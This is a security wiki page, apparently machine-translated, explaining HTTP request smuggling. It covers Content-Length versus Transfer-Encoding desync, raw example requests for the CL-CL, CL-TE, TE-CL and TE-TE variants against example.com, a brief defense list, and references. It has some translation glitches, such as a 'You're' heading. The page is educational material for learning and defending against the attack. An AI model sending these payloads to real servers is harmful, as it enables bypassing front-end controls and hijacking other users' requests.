HTTP request smuggling
========================================

Introduction
----------------------------------------
HTTP request smuggling is a technology that interferes with the way websites handle HTTP request sequences. It was first published in 2005 in an article <https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf>`_ propose.

Causes
----------------------------------------
Request smuggling mostly occurs when the front-end server and back-end server have inconsistent understanding of the data passed in by the client. This is because the HTTP specification provides two different ways to specify the end position of the request, namely the ``Content-Length`` and ``Transfer-Encoding`` headers.

Classification
----------------------------------------
- CLTE: The front-end server uses the ``Content-Length`` header, and the back-end server uses the ``Transfer-Encoding`` header
- TECL: The front-end server uses the ``Transfer-Encoding`` header, and the back-end server uses the ``Content-Length`` header.
- TETE: Both the front-end and back-end servers support the ``Transfer-Encoding`` header, but one of the servers can be induced to not process it in some way.

attack
----------------------------------------

GET request with CL not 0
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
The current server allows GET requests to carry the request body, while the backend server does not allow GET requests to carry the request body. It will directly ignore the ``Content-Length`` header in the GET request and do not process it. For example, the following example:

::

GET / HTTP/1.1
Host: example.com
Content-Length: 44

GET /secret HTTP/1.1
Host: example.com


The front-end server handled ``Content-Length``, while the back-end server did not handle ``Content-Length``. Based on the pipeline mechanism, it believes that these are two independent requests, which caused the vulnerability to occur.

CL-CL
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
According to RFC 7230, when the server receives two ``Content-Length`` requests, and the values of the two are different, an error of 400 is required, but some servers do not strictly implement this specification. In this case, when the current backend takes different ``Content-Length`` values, a vulnerability will occur. For example:

::

POST / HTTP/1.1
Host: example.com
Content-Length: 8
Content-Length: 7

12345
a

In this example a will be taken to the next request and becomes ``aGET / HTTP/1.1
``.

CL-TE
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
CL-TE refers to the front-end server processing the request header of ``Content-Length``, while the back-end server complies with the provisions of RFC2616, ignores ``Content-Length`` and handles ``Transfer-Encoding``. For example:

::

POST / HTTP/1.1
Host: example.com
...
Connection: keep-alive
Content-Length: 6
Transfer-Encoding: chunked

0

a

In this example, a will also be taken to the next request and becomes ``aGET / HTTP/1.1
``.

TE-CL
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
TE-CL refers to the front-end server processing the ``Transfer-Encoding`` request header, while the back-end server processing the ``Content-Length`` request header. For example:

::

POST / HTTP/1.1
Host: example.com
...
Content-Length: 4
Transfer-Encoding: chunked

12
aPOST / HTTP/1.1

0


You're
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
TE-TE means that both front and backend servers process the ``Transfer-Encoding`` request header, but it performs differently in fault tolerance. For example, some servers may process the ``Transfer-encoding``, tests such as:

::

POST / HTTP/1.1
Host: example.com
...
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5C
aPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


defense
----------------------------------------
- Disable backend connection reuse
- Make sure all servers in the connection have the same configuration
- Reject ambiguity requests

Reference link
----------------------------------------

RFC
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `RFC 2616 Hypertext Transfer Protocol -- HTTP/1.1 <https://tools.ietf.org/html/rfc2616>`_
- `RFC 7230 Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing -- HTTP/1.1 <https://tools.ietf.org/html/rfc7230>`_

Blog / Whitepaper
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `HTTP Request Smuggling by chaiml <https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf>`_
- `HTTP request smuggling by portswigger <https://portswigger.net/web-security/request-smuggling>`_
- `HTTP request smuggling from one question to protocol-level attacks <https://xz.aliyun.com/t/6654>`_
- `HTTP Request Smuggling in 2020 <http://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf>`_
- `h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c) <https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-cleartext-h2c>`_
